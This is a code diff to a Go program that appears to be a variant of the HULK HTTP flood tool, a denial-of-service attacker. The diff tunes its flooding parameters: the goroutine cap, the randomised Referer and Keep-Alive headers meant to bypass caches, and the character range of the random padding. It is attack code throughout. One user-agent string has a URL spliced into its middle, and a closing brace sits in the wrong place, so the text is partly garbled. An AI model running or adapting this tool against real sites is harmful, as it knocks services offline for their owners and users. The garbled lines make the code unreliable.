@@ -564,7 +564,7 @@ var (
 			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
 			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
 			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]
-	}
+}
 	cur int32
 )
 
@@ -599,7 +599,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 10000000
+		maxproc = 950000
 	}
 
 	u, err := url.Parse(site)
@@ -639,7 +639,7 @@ func main() {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
-			if sent%1000 == 0 {
+			if sent%100 == 0 {
 				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
@@ -696,8 +696,8 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+500))
-		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+200))
+		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(100)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 
@@ -731,7 +731,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 func buildblock(size int) (s string) {
 	var a []rune
 	for i := 0; i < size; i++ {
-		a = append(a, rune(rand.Intn(30)+70))
+		a = append(a, rune(rand.Intn(25)+65))
 	}
 	return string(a)
 }
